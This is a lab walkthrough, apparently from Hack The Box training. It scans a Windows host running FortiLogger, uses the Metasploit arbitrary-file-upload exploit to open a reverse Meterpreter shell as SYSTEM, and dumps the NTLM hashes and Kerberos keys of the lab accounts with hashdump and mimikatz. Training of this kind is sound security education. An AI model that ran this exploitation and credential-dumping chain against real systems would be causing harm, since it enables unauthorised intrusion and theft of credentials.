
```
msf6 > db_nmap -sV -A -p- -T5 10.129.199.93
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-28 10:18 -03
[*] Nmap: Warning: 10.129.199.93 giving up on port because retransmission cap hit (2).
[*] Nmap: Nmap scan report for 10.129.199.93
[*] Nmap: Host is up (0.14s latency).
[*] Nmap: Not shown: 64279 closed tcp ports (conn-refused), 1241 filtered tcp ports (no-response)
[*] Nmap: PORT      STATE SERVICE       VERSION
[*] Nmap: 135/tcp   open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds?
[*] Nmap: 3389/tcp  open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: | rdp-ntlm-info:
[*] Nmap: |   Target_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   NetBIOS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Domain_Name: WIN-51BJ97BCIPV
[*] Nmap: |   DNS_Computer_Name: WIN-51BJ97BCIPV
[*] Nmap: |   Product_Version: 10.0.17763
[*] Nmap: |_  System_Time: 2024-05-28T13:26:55+00:00
[*] Nmap: | ssl-cert: Subject: commonName=WIN-51BJ97BCIPV
[*] Nmap: | Not valid before: 2024-05-27T12:51:44
[*] Nmap: |_Not valid after:  2024-11-26T12:51:44
[*] Nmap: |_ssl-date: 2024-05-28T13:27:01+00:00; 0s from scanner time.
[*] Nmap: 5000/tcp  open  http          Microsoft IIS httpd 10.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE
[*] Nmap: |_http-title: FortiLogger | Log and Report System
[*] Nmap: |_http-server-header: Microsoft-IIS/10.0
[*] Nmap: 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: |_http-title: Not Found
[*] Nmap: 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: |_http-title: Not Found
[*] Nmap: |_http-server-header: Microsoft-HTTPAPI/2.0
[*] Nmap: 49664/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49665/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49666/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49667/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49668/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49669/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49670/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: 49671/tcp open  msrpc         Microsoft Windows RPC
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Host script results:
[*] Nmap: | smb2-security-mode:
[*] Nmap: |   3:1:1:
[*] Nmap: |_    Message signing enabled but not required
[*] Nmap: | smb2-time:
[*] Nmap: |   date: 2024-05-28T13:26:56
[*] Nmap: |_  start_date: N/A
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 501.56 seconds
msf6 > hosts

Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
10.129.199.93             Unknown                    device

msf6 > services 
Services
========

host           port   proto  name           state  info
----           ----   -----  ----           -----  ----
10.129.199.93  135    tcp    msrpc          open   Microsoft Windows RPC
10.129.199.93  139    tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
10.129.199.93  445    tcp    microsoft-ds   open
10.129.199.93  3389   tcp    ms-wbt-server  open   Microsoft Terminal Services
10.129.199.93  5000   tcp    http           open   Microsoft IIS httpd 10.0
10.129.199.93  5985   tcp    http           open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.129.199.93  49664  tcp    msrpc          open   Microsoft Windows RPC
10.129.199.93  49665  tcp    msrpc          open   Microsoft Windows RPC
10.129.199.93  49666  tcp    msrpc          open   Microsoft Windows RPC
10.129.199.93  49667  tcp    msrpc          open   Microsoft Windows RPC
10.129.199.93  49670  tcp    msrpc          open   Microsoft Windows RPC
10.129.199.93  49671  tcp    msrpc          open   Microsoft Windows RPC

```

Now , let's check the  http server at  port 5000
![[Pasted image 20240528113238.png]]

let's grab the banner to check if there is further information 

```
$ whatweb 10.129.199.93:5000
http://10.129.199.93:5000 [200 OK] ASP_NET[4.0.30319][MVC5.2], Bootstrap, Cookies[ASP.NET_SessionId,langname], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], HttpOnly[ASP.NET_SessionId], IP[10.129.199.93], JQuery, Meta-Author[Snowflakecode], Microsoft-IIS[10.0], PasswordField[txtpassword], Script[text/javascript], Title[FortiLogger | Log and Report System], UncommonHeaders[x-aspnetmvc-version], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge]

```

No more information, just name of the application "FortiLooger", lets dive into the first question

## Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?


```
msf6 > search fortilogger

Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  exploit/windows/http/fortilogger_arbitrary_fileupload  2021-02-26       normal  Yes    FortiLogger Arbitrary File Upload Exploit


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/fortilogger_arbitrary_fileupload

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > options

Module options (exploit/windows/http/fortilogger_arbitrary_fileupload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      5000             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the FortiLogger
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.15.17    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   FortiLogger < 5.2.0


msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set lhost tun0
lhost => 10.10.14.167
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set rhosts 10.129.199.93
rhosts => 10.129.199.93
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > check 
[+] 10.129.199.93:5000 - The target is vulnerable. FortiLogger version 4.4.2.2
msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > run

[*] Started reverse TCP handler on 10.10.14.167:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. FortiLogger version 4.4.2.2
[+] Generate Payload
[+] Payload has been uploaded
[*] Executing payload...
[*] Sending stage (176198 bytes) to 10.129.199.93
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.37, but the operating system provides version 2.38.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
WARNING:  database "msf" has a collation version mismatch
DETAIL:  The database was created using collation version 2.37, but the operating system provides version 2.38.
HINT:  Rebuild all objects in this database that use the default collation and run ALTER DATABASE msf REFRESH COLLATION VERSION, or build PostgreSQL with the right library version.
[*] Meterpreter session 1 opened (10.10.14.167:4444 -> 10.129.199.93:49705) at 2024-05-28 11:29:48 -0300

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM

```

The answer is : 
> ==NT AUTHORITY\SYSTEM==


## Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.


```
meterpreter > hashdump 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

[!] Loaded x86 Kiwi on an x64 architecture.

Success.

meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : WIN-51BJ97BCIPV
SysKey : c897d22c1c56490b453e326f86b2eef8
Local SID : S-1-5-21-2348711446-3829538955-3974936019

SAMKey : e52d743c76043bf814df6e48f1efcb23

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : d0e507b237b40a3a1f62ba1935465406

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 545c81812fc803221b22e47ab8789c104f38b151c677fbc4006894db6d174f1b
      aes128_hmac       (4096) : 5d59bcd0e74c5ed8951b9f2b658eef43
      des_cbc_md5       (4096) : 76436b1c190d892a
    OldCredentials
      aes256_hmac       (4096) : a394ab9b7c712a9e0f3edb58404f9cf086132d29ab5b796d937b197862331b07
      aes128_hmac       (4096) : 7630dab9bdaeebf9b4aa6c595347a0cc
      des_cbc_md5       (4096) : 9876615285c2766e
    OlderCredentials
      aes256_hmac       (4096) : 09c55a10e6b955caac4abbf7ff37b81488a2ede67a150c00c775fa00d94768ab
      aes128_hmac       (4096) : b49643128581ac08a1fae957f7787f72
      des_cbc_md5       (4096) : d32592d63b75ec1f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVAdministrator
    Credentials
      des_cbc_md5       : 76436b1c190d892a
    OldCredentials
      des_cbc_md5       : 9876615285c2766e


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 92793b2cbb0532b4fbea6c62ee1c72c8

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c34300ce936f766e6b0aca4191b93dfb576bbe9efa2d2888b3f275c74d7d9c55
      aes128_hmac       (4096) : 6b6a769c33971f0da23314d5cef8413e
      des_cbc_md5       (4096) : 61299e7a768fa2d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 61299e7a768fa2d5


RID  : 000003ea (1002)
User : htb-student
  Hash NTLM: cf3a5525ee9414229e66279623ed5c58

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f88979e2a6999b5cbc7a9308e7b4cd82

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1ed226feb91bfd21489a12a58c6cb38b99ab70feb30d971c8987fb44bcb15213
      aes128_hmac       (4096) : 629343148027bcf0d48cf49b066a9960
      des_cbc_md5       (4096) : 379791d616ef6d0e

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-51BJ97BCIPVhtb-student
    Credentials
      des_cbc_md5       : 379791d616ef6d0e


```

The answer is : 
> ==cf3a5525ee9414229e66279623ed5c58==
